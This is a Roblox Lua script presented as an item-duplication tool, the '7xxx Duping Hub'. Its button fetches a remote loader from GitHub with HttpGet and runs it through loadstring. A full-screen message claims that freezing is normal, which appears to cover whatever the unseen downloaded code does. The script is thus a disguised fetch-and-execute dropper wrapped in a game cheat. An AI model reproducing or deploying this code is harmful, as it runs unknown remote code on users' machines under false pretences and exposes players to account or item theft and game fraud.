-- Create the freeze screen function
local function createFreezeScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FreezeScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

    -- Create a semi-transparent background
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BackgroundTransparency = 0.7
    background.Parent = screenGui

    -- Create the warning text
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "WarningText"
    textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
    textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 0, 0)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextSize = 24
    textLabel.Text = "PLS WAIT - It's normal to freeze your game when duping"
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextYAlignment = Enum.TextYAlignment.Center
    textLabel.Parent = screenGui

    -- Add a loading spinner
    local spinner = Instance.new("ImageLabel")
    spinner.Name = "Spinner"
    spinner.Size = UDim2.new(0, 50, 0, 50)
    spinner.Position = UDim2.new(0.5, -25, 0.6, 0)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://5644704149" -- Default loading spinner image
    spinner.Parent = screenGui

    -- Animate the spinner
    coroutine.wrap(function()
        while spinner and spinner.Parent do
            spinner.Rotation = spinner.Rotation + 5
            task.wait()
        end
    end)()

    return screenGui
end

-- Create the main UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DupingUI"
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "7xxx Duping Hub"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0.8, 0, 0, 40)
Button.Position = UDim2.new(0.1, 0, 0.5, -20)
Button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
Button.Text = "Start Duping Process"
Button.TextColor3 = Color3.new(1, 1, 1)
Button.Font = Enum.Font.Gotham
Button.TextSize = 16
Button.Parent = Frame

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 8)
UICorner2.Parent = Button

-- Button click handler
Button.MouseButton1Click:Connect(function()
    -- Create freeze screen
    local freezeScreen = createFreezeScreen()
    
    -- Execute after a small delay to ensure freeze screen shows
    task.delay(0.5, function()
        -- Execute the script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
        end)
        
        -- Remove freeze screen after 15 seconds regardless of success
        task.delay(15, function()
            if freezeScreen and freezeScreen.Parent then
                freezeScreen:Destroy()
            end
            
            if not success then
                warn("Duping script failed to load:", err)
                -- You could show an error message here if you want
            end
        end)
    end)
end)
